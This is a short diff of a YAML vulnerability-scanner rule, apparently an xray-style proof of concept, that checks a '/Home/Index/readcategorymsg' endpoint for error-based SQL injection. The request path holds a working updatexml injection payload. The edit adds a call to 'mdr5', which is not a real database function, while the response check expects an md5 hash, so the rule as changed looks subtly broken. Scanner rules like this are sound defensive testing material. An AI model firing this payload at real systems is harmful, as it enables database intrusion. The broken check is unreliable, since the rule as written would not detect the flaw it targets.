@@ -5,9 +5,9 @@ set:
 
 rules:
   - method: GET
-    path: /Home/Index/readcategorymsg?category[0]=bind&category[1]=0 and (updatexml(1,concat(0x7e,({{r}}),0x7e),0))
+    path: /Home/Index/readcategorymsg?category[0]=bind&category[1]=0 and (updatexml(1,concat(0x7e,(mdr5({{r}})),0x7e),0))
     expression: |
-      response.status == 404 && response.body.bcontains(bytes(string(r)))
+      response.status == 404 && response.body.bcontains(bytes(md5(string(r))))
 
 detail:
   author: durkworf(https://github.com/durkworf)
